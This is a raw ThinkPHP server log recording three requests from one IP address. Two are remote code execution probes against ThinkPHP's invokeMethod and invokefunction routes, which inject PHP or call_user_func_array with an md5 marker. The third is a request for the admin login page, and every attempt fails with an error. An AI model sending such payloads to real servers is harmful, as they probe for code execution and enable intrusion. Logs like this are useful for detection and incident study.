[ 2023-07-12T21:34:28+08:00 ] 185.213.174.190 /index.php?s=/admin/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000030s ]
INFO: [ app_init ] --END-- [ RunTime:0.000796s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000957s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001056s ]
ERR: 无法加载控制器:Think\app

[ 2023-07-12T21:34:34+08:00 ] 185.213.174.190 /index.php?s=/admin/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
INFO: [ app_init ] --END-- [ RunTime:0.000829s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001046s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001162s ]
ERR: 无法加载控制器:Think\app

[ 2023-07-12T21:34:47+08:00 ] 185.213.174.190 /admin/login/login.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000676s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000675s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000750s ]
ERR: 非法操作:login

